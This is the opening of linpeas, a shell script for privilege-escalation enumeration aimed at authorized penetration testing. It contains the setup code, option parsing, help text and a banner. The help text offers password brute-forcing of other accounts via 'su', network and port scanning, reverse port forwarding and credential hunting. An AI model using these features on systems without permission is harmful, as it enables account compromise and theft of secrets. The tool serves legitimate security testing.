     1	#!/bin/sh
     2	
     3	VERSION="ng"
     4	ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission."
     5	
     6	###########################################
     7	#-------) Checks pre-everything (---------#
     8	###########################################
     9	if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
    10	  IAMROOT="1"
    11	  MAXPATH_FIND_W="3"
    12	else
    13	  IAMROOT=""
    14	  MAXPATH_FIND_W="7"
    15	fi
    16	
    17	
    18	###########################################
    19	#---------------) Colors (----------------#
    20	###########################################
    21	
    22	C=$(printf '\033')
    23	RED="${C}[1;31m"
    24	SED_RED="${C}[1;31m&${C}[0m"
    25	GREEN="${C}[1;32m"
    26	SED_GREEN="${C}[1;32m&${C}[0m"
    27	YELLOW="${C}[1;33m"
    28	SED_YELLOW="${C}[1;33m&${C}[0m"
    29	RED_YELLOW="${C}[1;31;103m"
    30	SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
    31	BLUE="${C}[1;34m"
    32	SED_BLUE="${C}[1;34m&${C}[0m"
    33	ITALIC_BLUE="${C}[1;34m${C}[3m"
    34	LIGHT_MAGENTA="${C}[1;95m"
    35	SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
    36	LIGHT_CYAN="${C}[1;96m"
    37	SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
    38	LG="${C}[1;37m" #LightGray
    39	SED_LG="${C}[1;37m&${C}[0m"
    40	DG="${C}[1;90m" #DarkGray
    41	SED_DG="${C}[1;90m&${C}[0m"
    42	NC="${C}[0m"
    43	UNDERLINED="${C}[5m"
    44	ITALIC="${C}[3m"
    45	
    46	
    47	###########################################
    48	#---------) Parsing parameters (----------#
    49	###########################################
    50	# --) FAST - Do not check 1min of procceses and su brute
    51	# --) SUPERFAST - FAST & do not search for special filaes in all the folders
    52	
    53	if uname 2>/dev/null | grep -q 'Darwin' || /usr/bin/uname 2>/dev/null | grep -q 'Darwin'; then MACPEAS="1"; else MACPEAS=""; fi
    54	FAST="1" #By default stealth/fast mode
    55	SUPERFAST=""
    56	DISCOVERY=""
    57	PORTS=""
    58	QUIET=""
    59	CHECKS="system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex"
    60	SEARCH_IN_FOLDER=""
    61	ROOT_FOLDER="/"
    62	WAIT=""
    63	PASSWORD=""
    64	NOCOLOR=""
    65	DEBUG=""
    66	AUTO_NETWORK_SCAN=""
    67	EXTRA_CHECKS=""
    68	REGEXES=""
    69	PORT_FORWARD=""
    70	THREADS="$( ( (grep -c processor /proc/cpuinfo 2>/dev/null) || ( (command -v lscpu >/dev/null 2>&1) && (lscpu | grep '^CPU(s):' | awk '{print $2}')) || echo -n 2) | tr -d "\n")"
    71	[ -z "$THREADS" ] && THREADS="2" #If THREADS is empty, put number 2
    72	[ -n "$THREADS" ] && THREADS="2" #If THREADS is null, put number 2
    73	[ "$THREADS" -eq "$THREADS" ] 2>/dev/null && : || THREADS="2" #It THREADS is not a number, put number 2
    74	HELP=$GREEN"Enumerate and search Privilege Escalation vectors.
    75	${NC}This tool enum and search possible misconfigurations$DG (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...)$NC inside the host and highlight possible misconfigurations with colors.
    76	      ${GREEN}  Checks:
    77	        ${YELLOW}    -o${BLUE} Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.
    78	        ${YELLOW}    -s${BLUE} Stealth & faster (don't check some time consuming checks)
    79	        ${YELLOW}    -e${BLUE} Perform extra enumeration
    80	        ${YELLOW}    -t${BLUE} Automatic network scan & Internet conectivity checks - This option writes to files
    81	        ${YELLOW}    -r${BLUE} Enable Regexes (this can take from some mins to hours)
    82	        ${YELLOW}    -P${BLUE} Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
    83		${YELLOW}    -D${BLUE} Debug mode
    84		
    85	      ${GREEN}  Network recon:
    86	        ${YELLOW}    -t${BLUE} Automatic network scan & Internet conectivity checks - This option writes to files
    87		${YELLOW}    -d <IP/NETMASK>${BLUE} Discover hosts using fping or ping.$DG Ex: -d 192.168.0.1/24
    88	        ${YELLOW}    -p <PORT(s)> -d <IP/NETMASK>${BLUE} Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports.$DG Ex: -d 192.168.0.1/24 -p 53,139
    89	        ${YELLOW}    -i <IP> [-p <PORT(s)>]${BLUE} Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead.$DG Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
    90	        $GREEN     Notice${BLUE} that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed
    91	      
    92	      ${GREEN}  Port forwarding (reverse connection):
    93	        ${YELLOW}    -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT${BLUE} Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)
    94	      
    95	      ${GREEN}  Firmware recon:
    96	        ${YELLOW}    -f </FOLDER/PATH>${BLUE} Execute linpeas to search passwords/file permissions misconfigs inside a folder
    97		
    98	      ${GREEN}  Misc:
    99	        ${YELLOW}    -h${BLUE} To show this message
   100		${YELLOW}    -w${BLUE} Wait execution between big blocks of checks
   101	        ${YELLOW}    -L${BLUE} Force linpeas execution
   102	        ${YELLOW}    -M${BLUE} Force macpeas execution
   103		${YELLOW}    -q${BLUE} Do not show banner
   104	        ${YELLOW}    -N${BLUE} Do not use colours$NC"
   105	
   106	while getopts "h?asd:p:i:P:qo:LMwNDterf:F:" opt; do
   107	  case "$opt" in
   108	    h|\?) printf "%s\n\n" "$HELP$NC"; exit 0;;
   109	    a)  FAST="";EXTRA_CHECKS="1";;
   110	    s)  SUPERFAST=1;;
   111	    d)  DISCOVERY=$OPTARG;;
   112	    p)  PORTS=$OPTARG;;
   113	    i)  IP=$OPTARG;;
   114	    P)  PASSWORD=$OPTARG;;
   115	    q)  QUIET=1;;
   116	    o)  CHECKS=$OPTARG;;
   117	    L)  MACPEAS="";;
   118	    M)  MACPEAS="1";;
   119	    w)  WAIT=1;;
   120	    N)  NOCOLOR="1";;
   121	    D)  DEBUG="1";;
   122	    t)  AUTO_NETWORK_SCAN="1"; CHECKS="network_information";;
   123	    e)  EXTRA_CHECKS="1";;
   124	    r)  REGEXES="1";;
   125	    f)  SEARCH_IN_FOLDER=$OPTARG;
   126	    	if ! [ "$(echo -n $SEARCH_IN_FOLDER | tail -c 1)" = "/" ]; then #Make sure firmware folder ends with "/"
   127	        SEARCH_IN_FOLDER="${SEARCH_IN_FOLDER}/"; 
   128	      fi;
   129	          ROOT_FOLDER=$SEARCH_IN_FOLDER;
   130	      REGEXES="1";
   131		    CHECKS="procs_crons_timers_srvcs_sockets,software_information,interesting_perms_files,interesting_files,api_keys_regex";;
   132		
   133	    F)  PORT_FORWARD=$OPTARG;;
   134	    esac
   135	done
   136	
   137	if [ "$MACPEAS" ]; then SCRIPTNAME="macpeas"; else SCRIPTNAME="linpeas"; fi
   138	if [ "$NOCOLOR" ]; then
   139	  C=""
   140	  RED=""
   141	  SED_RED="&"
   142	  GREEN=""
   143	  SED_GREEN="&"
   144	  YELLOW=""
   145	  SED_YELLOW="&"
   146	  SED_RED_YELLOW="&"
   147	  BLUE=""
   148	  SED_BLUE="&"
   149	  ITALIC_BLUE=""
   150	  LIGHT_MAGENTA=""
   151	  SED_LIGHT_MAGENTA="&"
   152	  LIGHT_CYAN=""
   153	  SED_LIGHT_CYAN="&"
   154	  LG=""
   155	  SED_LG="&"
   156	  DG=""
   157	  SED_DG="&"
   158	  NC=""
   159	  UNDERLINED=""
   160	  ITALIC=""
   161	fi
   162	
   163	
   164	###########################################
   165	#---------------) BANNER (----------------#
   166	###########################################
   167	
   168	print_banner(){
   169	  if [ "$MACPEAS" ]; then
   170	    bash -c "printf '                         \e[38;5;238mM-bM-^VM-^D\e[38;5;233mM-bM-^VM-^D\e[38;5;235mM-bM-^VM-^D\e[38;5;65mM-bM-^VM-^D\e[48;5;239m\e[38;5;107mM-bM-^VM-^D\e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;232m\e[38;5;71mM-bM-^VM-^D\e[48;5;0m\e[38;5;71mM-bM-^VM-^D\e[48;5;232m\e[38;5;71mM-bM-^VM-^D\e[48;5;232m\e[38;5;71mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;235m\e[38;5;71mM-bM-^VM-^D\e[48;5;240m\e[38;5;65mM-bM-^VM-^D\e[0m\e[38;5;237mM-bM-^VM-^D\e[38;5;234mM-bM-^VM-^D\e[38;5;233mM-bM-^VM-^D\e[38;5;232mM-bM-^VM-^D\e[38;5;239mM-bM-^VM-^D\e[0m
   171	                      \e[38;5;233mM-bM-^VM-^D\e[38;5;246mM-bM-^VM-^D\e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[48;5;237m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m    \e[38;5;65mM-bM-^VM-^D\e[48;5;71m\e[38;5;237mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;237mM-bM-^VM-^D\e[48;5;71m\e[38;5;65mM-bM-^VM-^D\e[48;5;71m        \e[48;5;65m\e[38;5;71mM-bM-^VM-^D\e[48;5;235m\e[38;5;71mM-bM-^VM-^D\e[48;5;235m\e[38;5;71mM-bM-^VM-^D\e[0m\e[38;5;237mM-bM-^VM-^D\e[38;5;234mM-bM-^VM-^D\e[0m
   172	                  \e[38;5;245mM-bM-^VM-^D\e[38;5;233mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;239m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m  \e[38;5;235mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;236m\e[38;5;64mM-bM-^VM-^D\e[48;5;234m\e[38;5;76mM-bM-^VM-^D\e[48;5;232m\e[38;5;76mM-bM-^VM-^D\e[48;5;234m\e[38;5;76mM-bM-^VM-^D\e[48;5;2m\e[38;5;76mM-bM-^VM-^D\e[48;5;64m\e[38;5;76mM-bM-^VM-^D\e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;64m\e[38;5;76mM-bM-^VM-^D\e[48;5;2m\e[38;5;76mM-bM-^VM-^D\e[48;5;22m\e[38;5;76mM-bM-^VM-^D\e[48;5;232m\e[38;5;76mM-bM-^VM-^D\e[48;5;232m\e[38;5;70mM-bM-^VM-^D\e[48;5;234m\e[38;5;22mM-bM-^VM-^D\e[48;5;65m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m\e[38;5;238mM-bM-^VM-^D\e[48;5;71m       \e[48;5;237m\e[38;5;71mM-bM-^VM-^D\e[48;5;236m\e[38;5;71mM-bM-^VM-^D\e[0m\e[38;5;234mM-bM-^VM-^D\e[38;5;238mM-bM-^VM-^D\e[0m
   173	               \e[38;5;239mM-bM-^VM-^D\e[38;5;233mM-bM-^VM-^D\e[48;5;235m\e[38;5;71mM-bM-^VM-^D\e[48;5;238m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m  \e[38;5;0mM-bM-^VM-^D\e[48;5;236m\e[38;5;2mM-bM-^VM-^D\e[48;5;232m\e[38;5;76mM-bM-^VM-^D\e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m \e[38;5;70mM-bM-^VM-^D\e[48;5;76m\e[38;5;64mM-bM-^VM-^D\e[48;5;76m\e[38;5;2mM-bM-^VM-^D\e[48;5;76m\e[38;5;22mM-bM-^VM-^D\e[48;5;76m\e[38;5;22mM-bM-^VM-^D\e[48;5;76m\e[38;5;22mM-bM-^VM-^D\e[48;5;76m\e[38;5;2mM-bM-^VM-^D\e[48;5;76m\e[38;5;2mM-bM-^VM-^D\e[48;5;76m\e[38;5;64mM-bM-^VM-^D\e[48;5;76m\e[38;5;70mM-bM-^VM-^D\e[48;5;76m      \e[48;5;22m\e[38;5;76mM-bM-^VM-^D\e[48;5;0m\e[38;5;76mM-bM-^VM-^D\e[48;5;234m\e[38;5;64mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m\e[38;5;235mM-bM-^VM-^D\e[48;5;71m       \e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[48;5;234m\e[38;5;71mM-bM-^VM-^D\e[0m\e[38;5;234mM-bM-^VM-^D\e[38;5;233mM-bM-^VM-^D\e[0m
   174	            \e[38;5;233mM-bM-^VM-^D\e[38;5;71mM-bM-^VM-^D\e[48;5;233m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m   \e[38;5;235mM-bM-^VM-^D\e[48;5;65m\e[38;5;235mM-bM-^VM-^D\e[48;5;0m\e[38;5;255mM-bM-^VM-^D\e[48;5;22m\e[38;5;15mM-bM-^VM-^D\e[48;5;235m\e[38;5;15mM-bM-^VM-^D\e[48;5;242m\e[38;5;15mM-bM-^VM-^D\e[48;5;249m\e[38;5;15mM-bM-^VM-^D\e[48;5;254m\e[38;5;15mM-bM-^VM-^D\e[48;5;15m         \e[38;5;255mM-bM-^VM-^D\e[48;5;255m\e[38;5;234mM-bM-^VM-^D\e[48;5;248m\e[38;5;251mM-bM-^VM-^D\e[48;5;240m\e[38;5;15mM-bM-^VM-^D\e[48;5;237m\e[38;5;15mM-bM-^VM-^D\e[48;5;235m\e[38;5;15mM-bM-^VM-^D\e[48;5;64m\e[38;5;15mM-bM-^VM-^D\e[48;5;70m\e[38;5;251mM-bM-^VM-^D\e[48;5;76m\e[38;5;8mM-bM-^VM-^D\e[48;5;76m\e[38;5;237mM-bM-^VM-^D\e[48;5;76m\e[38;5;2mM-bM-^VM-^D\e[48;5;64m\e[38;5;70mM-bM-^VM-^D\e[48;5;232m\e[38;5;76mM-bM-^VM-^D\e[48;5;238m\e[38;5;2mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;65mM-bM-^VM-^D\e[48;5;71m        \e[48;5;237m\e[38;5;71mM-bM-^VM-^D\e[0m
   175	         \e[38;5;233mM-bM-^VM-^D\e[48;5;238m\e[38;5;71mM-bM-^VM-^D\e[48;5;236m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m    \e[38;5;65mM-bM-^VM-^D\e[48;5;238m\e[38;5;234mM-bM-^VM-^D\e[48;5;235m\e[38;5;255mM-bM-^VM-^D\e[48;5;15m             \e[38;5;233mM-bM-^VM-^D\e[48;5;253m\e[38;5;0mM-bM-^VM-^D\e[48;5;255m\e[38;5;232mM-bM-^VM-^D\e[48;5;242m\e[38;5;238mM-bM-^VM-^D\e[48;5;242m\e[38;5;233mM-bM-^VM-^D\e[48;5;15m\e[38;5;237mM-bM-^VM-^D\e[48;5;15m\e[38;5;255mM-bM-^VM-^D\e[48;5;15m      \e[48;5;255m\e[38;5;15mM-bM-^VM-^D\e[48;5;145m\e[38;5;15mM-bM-^VM-^D\e[48;5;237m\e[38;5;15mM-bM-^VM-^D\e[48;5;22m\e[38;5;255mM-bM-^VM-^D\e[48;5;70m\e[38;5;248mM-bM-^VM-^D\e[48;5;234m\e[38;5;235mM-bM-^VM-^D\e[48;5;234m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;0mM-bM-^VM-^D\e[48;5;71m\e[38;5;238mM-bM-^VM-^D\e[48;5;71m      \e[0m
   176	         \e[48;5;71m      \e[38;5;234mM-bM-^VM-^D\e[48;5;233m\e[38;5;251mM-bM-^VM-^D\e[48;5;255m\e[38;5;15mM-bM-^VM-^D\e[48;5;15m             \e[48;5;243m\e[38;5;235mM-bM-^VM-^D\e[48;5;0m     \e[38;5;243mM-bM-^VM-^D\e[48;5;249m\e[38;5;15mM-bM-^VM-^D\e[48;5;15m            \e[48;5;255m\e[38;5;15mM-bM-^VM-^D\e[48;5;249m\e[38;5;15mM-bM-^VM-^D\e[48;5;235m\e[38;5;15mM-bM-^VM-^D\e[48;5;232m\e[38;5;15mM-bM-^VM-^D\e[48;5;235m\e[38;5;145mM-bM-^VM-^D\e[48;5;71m\e[38;5;0mM-bM-^VM-^D\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m\e[38;5;233mM-bM-^VM-^D\e[48;5;71m\e[38;5;237mM-bM-^VM-^D\e[0m
   177	         \e[48;5;71m     \e[48;5;65m\e[38;5;232mM-bM-^VM-^D\e[48;5;241m\e[38;5;15mM-bM-^VM-^D\e[48;5;15m               \e[48;5;236m\e[38;5;245mM-bM-^VM-^D\e[48;5;0m     \e[48;5;247m\e[38;5;232mM-bM-^VM-^D\e[48;5;15m                  \e[48;5;247m\e[38;5;15mM-bM-^VM-^D\e[48;5;236m\e[38;5;235mM-bM-^VM-^D\e[48;5;236m \e[48;5;237m\e[38;5;236mM-bM-^VM-^D\e[0m
   178	         \e[48;5;71m   \e[38;5;238mM-bM-^VM-^D\e[48;5;234m\e[38;5;243mM-bM-^VM-^D\e[48;5;253m\e[38;5;15mM-bM-^VM-^D\e[48;5;15m                 \e[48;5;0m\e[38;5;7mM-bM-^VM-^D\e[48;5;0m\e[38;5;239mM-bM-^VM-^D\e[48;5;0m\e[38;5;102mM-bM-^VM-^D\e[48;5;0m\e[38;5;234mM-bM-^VM-^D\e[48;5;0m\e[38;5;232mM-bM-^VM-^D\e[48;5;0m\e[38;5;252mM-bM-^VM-^D\e[48;5;255m\e[38;5;15mM-bM-^VM-^D\e[48;5;15m                  \e[48;5;239m\e[38;5;7mM-bM-^VM-^D\e[48;5;236m\e[38;5;235mM-bM-^VM-^D\e[48;5;236m \e[0m
   179	         \e[48;5;71m  \e[38;5;236mM-bM-^VM-^D\e[48;5;234m\e[38;5;250mM-bM-^VM-^D\e[48;5;15m  \e[38;5;255mM-bM-^VM-^D\e[48;5;15m\e[38;5;250mM-bM-^VM-^D\e[48;5;15m\e[38;5;102mM-bM-^VM-^D\e[48;5;15m\e[38;5;238mM-bM-^VM-^D\e[48;5;15m\e[38;5;235mM-bM-^VM-^D\e[48;5;15m\e[38;5;236mM-bM-^VM-^D\e[48;5;15m\e[38;5;236mM-bM-^VM-^D\e[48;5;15m\e[38;5;2mM-bM-^VM-^D\e[48;5;255m\e[38;5;2mM-bM-^VM-^D\e[48;5;255m\e[38;5;64mM-bM-^VM-^D\e[48;5;254m\e[38;5;70mM-bM-^VM-^D\e[48;5;188m\e[38;5;70mM-bM-^VM-^D\e[48;5;253m\e[38;5;70mM-bM-^VM-^D\e[48;5;255m\e[38;5;70mM-bM-^VM-^D\e[48;5;255m\e[38;5;70mM-bM-^VM-^D\e[48;5;255m\e[38;5;70mM-bM-^VM-^D\e[48;5;15m\e[38;5;28mM-bM-^VM-^D\e[48;5;15m\e[38;5;64mM-bM-^VM-^D\e[48;5;15m\e[38;5;236mM-bM-^VM-^D\e[48;5;15m\e[38;5;237mM-bM-^VM-^D\e[48;5;15m\e[38;5;236mM-bM-^VM-^D\e[48;5;15m\e[38;5;237mM-bM-^VM-^D\e[48;5;15m\e[38;5;240mM-bM-^VM-^D\e[48;5;15m\e[38;5;102mM-bM-^VM-^D\e[48;5;15m\e[38;5;251mM-bM-^VM-^D\e[48;5;15m\e[38;5;255mM-bM-^VM-^D\e[48;5;15m                \e[48;5;255m\e[38;5;15mM-bM-^VM-^D\e[48;5;234m\e[38;5;235mM-bM-^VM-^D\e[48;5;236m \e[0m
   180	         \e[48;5;71m \e[38;5;233mM-bM-^VM-^D\e[48;5;232m\e[38;5;70mM-bM-^VM-^D\e[48;5;238m\e[38;5;76mM-bM-^VM-^D\e[48;5;65m\e[38;5;76mM-bM-^VM-^D\e[48;5;236m\e[38;5;76mM-bM-^VM-^D\e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m                       \e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;28m\e[38;5;76mM-bM-^VM-^D\e[48;5;234m\e[38;5;76mM-bM-^VM-^D\e[48;5;235m\e[38;5;76mM-bM-^VM-^D\e[48;5;240m\e[38;5;76mM-bM-^VM-^D\e[48;5;145m\e[38;5;76mM-bM-^VM-^D\e[48;5;15m\e[38;5;28mM-bM-^VM-^D\e[48;5;15m\e[38;5;235mM-bM-^VM-^D\e[48;5;15m\e[38;5;240mM-bM-^VM-^D\e[48;5;15m\e[38;5;145mM-bM-^VM-^D\e[48;5;15m\e[38;5;254mM-bM-^VM-^D\e[48;5;15m        \e[48;5;242m\e[38;5;251mM-bM-^VM-^D\e[48;5;236m\e[38;5;235mM-bM-^VM-^D\e[0m
   181	         \e[48;5;65m\e[38;5;232mM-bM-^VM-^D\e[48;5;235m\e[38;5;64mM-bM-^VM-^D\e[48;5;70m \e[48;5;76m                                     \e[48;5;2m\e[38;5;76mM-bM-^VM-^D\e[48;5;234m\e[38;5;76mM-bM-^VM-^D\e[48;5;242m\e[38;5;76mM-bM-^VM-^D\e[48;5;254m\e[38;5;64mM-bM-^VM-^D\e[48;5;15m\e[38;5;234mM-bM-^VM-^D\e[48;5;15m\e[38;5;243mM-bM-^VM-^D\e[48;5;15m\e[38;5;253mM-bM-^VM-^D\e[48;5;15m  \e[48;5;255m\e[38;5;15mM-bM-^VM-^D\e[48;5;233m \e[0m
   182	         \e[48;5;232m \e[48;5;237m \e[48;5;70m \e[48;5;76m        \e[38;5;70mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m                 \e[38;5;70mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;234mM-bM-^VM-^D\e[48;5;76m\e[38;5;70mM-bM-^VM-^D\e[48;5;76m       \e[48;5;28m\e[38;5;76mM-bM-^VM-^D\e[48;5;235m\e[38;5;76mM-bM-^VM-^D\e[48;5;102m\e[38;5;236mM-bM-^VM-^D\e[48;5;250m\e[38;5;235mM-bM-^VM-^D\e[48;5;233m\e[38;5;232mM-bM-^VM-^D\e[0m
   183	         \e[48;5;232m \e[48;5;237m \e[48;5;70m \e[48;5;76m       \e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;64m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m\e[38;5;64mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;233m\e[38;5;76mM-bM-^VM-^D\e[48;5;22m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m                  \e[48;5;22m\e[38;5;76mM-bM-^VM-^D\e[48;5;233m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m\e[38;5;70mM-bM-^VM-^D\e[48;5;28m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m        \e[48;5;70m \e[48;5;236m \e[48;5;238m \e[48;5;236m\e[0m
   184	         \e[48;5;232m\e[38;5;236mM-bM-^VM-^D\e[48;5;236m\e[38;5;233mM-bM-^VM-^D\e[48;5;64m \e[48;5;76m        \e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;22m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m         \e[38;5;64mM-bM-^VM-^D\e[48;5;76m\e[38;5;0mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m\e[38;5;0mM-bM-^VM-^D\e[48;5;76m\e[38;5;70mM-bM-^VM-^D\e[48;5;76m         \e[48;5;233m\e[38;5;76mM-bM-^VM-^D\e[48;5;70m\e[38;5;76mM-bM-^VM-^D\e[48;5;76m        \e[48;5;64m \e[48;5;236m \e[38;5;235mM-bM-^VM-^D\e[0m
   185	         \e[48;5;71m \e[48;5;232m\e[38;5;65mM-bM-^VM-^D\e[48;5;64m\e[38;5;233mM-bM-^VM-^D\e[48;5;76m          \e[38;5;107mM-bM-^VM-^D\e[48;5;77m\e[38;5;107mM-bM-^VM-^D\e[48;5;77m\e[38;5;107mM-bM-^VM-^D\e[48;5;77m\e[38;5;107mM-bM-^VM-^D\e[48;5;76m\e[38;5;77mM-bM-^VM-^D\e[48;5;76m     \e[48;5;0m\e[38;5;70mM-bM-^VM-^D\e[48;5;0m\e[38;5;232mM-bM-^VM-^D\e[48;5;0m\e[38;5;232mM-bM-^VM-^D\e[48;5;0m\e[38;5;70mM-bM-^VM-^D\e[48;5;76m      \e[38;5;77mM-bM-^VM-^D\e[48;5;76m\e[38;5;107mM-bM-^VM-^D\e[48;5;76m\e[38;5;107mM-bM-^VM-^D\e[48;5;76m\e[38;5;107mM-bM-^VM-^D\e[48;5;76m\e[38;5;77mM-bM-^VM-^D\e[48;5;76m        \e[38;5;70mM-bM-^VM-^D\e[48;5;236m \e[48;5;237m\e[38;5;238mM-bM-^VM-^D\e[48;5;234m\e[38;5;235mM-bM-^VM-^D\e[0m
   186	         \e[48;5;71m  \e[48;5;235m\e[38;5;71mM-bM-^VM-^D\e[48;5;64m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m        \e[48;5;77m\e[38;5;76mM-bM-^VM-^D\e[48;5;107m\e[38;5;77mM-bM-^VM-^D\e[48;5;107m  \e[38;5;77mM-bM-^VM-^D\e[48;5;77m \e[48;5;76m               \e[48;5;107m\e[38;5;77mM-bM-^VM-^D\e[48;5;107m   \e[48;5;71m\e[38;5;77mM-bM-^VM-^D\e[48;5;76m        \e[48;5;64m \e[48;5;236m\e[38;5;237mM-bM-^VM-^D\e[48;5;237m\e[38;5;234mM-bM-^VM-^D\e[0m
   187	         \e[48;5;71m    \e[48;5;232m\e[38;5;239mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m                                       \e[48;5;70m\e[38;5;64mM-bM-^VM-^D\e[48;5;237m\e[38;5;236mM-bM-^VM-^D\e[48;5;238m\e[38;5;234mM-bM-^VM-^D\e[48;5;235m\e[38;5;236mM-bM-^VM-^D\e[0m
   188	         \e[48;5;71m     \e[48;5;237m\e[38;5;71mM-bM-^VM-^D\e[48;5;232m\e[38;5;235mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m                                    \e[48;5;70m\e[38;5;236mM-bM-^VM-^D\e[48;5;236m \e[48;5;237m\e[38;5;234mM-bM-^VM-^D\e[48;5;235m\e[38;5;236mM-bM-^VM-^D\e[0m
   189	         \e[48;5;71m\e[38;5;237mM-bM-^VM-^D\e[48;5;71m\e[38;5;65mM-bM-^VM-^D\e[48;5;71m     \e[48;5;236m\e[38;5;71mM-bM-^VM-^D\e[48;5;232m\e[38;5;65mM-bM-^VM-^D\e[48;5;70m\e[38;5;0mM-bM-^VM-^D\e[48;5;76m\e[38;5;22mM-bM-^VM-^D\e[48;5;76m                              \e[38;5;22mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;70m\e[38;5;236mM-bM-^VM-^D\e[48;5;236m\e[38;5;235mM-bM-^VM-^D\e[48;5;235m\e[38;5;238mM-bM-^VM-^D\e[48;5;235m\e[38;5;238mM-bM-^VM-^D\e[48;5;235m\e[38;5;238mM-bM-^VM-^D\e[48;5;235m\e[38;5;238mM-bM-^VM-^D\e[48;5;236m\e[38;5;235mM-bM-^VM-^D\e[48;5;236m\e[38;5;233mM-bM-^VM-^D\e[0m
   190	           \e[38;5;233mM-bM-^VM-^@\e[48;5;71m\e[38;5;232mM-bM-^VM-^D\e[48;5;71m      \e[48;5;236m\e[38;5;71mM-bM-^VM-^D\e[48;5;0m\e[38;5;71mM-bM-^VM-^D\e[48;5;2m\e[38;5;235mM-bM-^VM-^D\e[48;5;76m\e[38;5;0mM-bM-^VM-^D\e[48;5;76m\e[38;5;22mM-bM-^VM-^D\e[48;5;76m                    \e[38;5;77mM-bM-^VM-^D\e[48;5;76m\e[38;5;236mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;76m\e[38;5;232mM-bM-^VM-^D\e[48;5;22m\e[38;5;238mM-bM-^VM-^D\e[48;5;232m\e[38;5;71mM-bM-^VM-^D\e[48;5;65m\e[38;5;71mM-bM-^VM-^D\e[48;5;71m         \e[0m
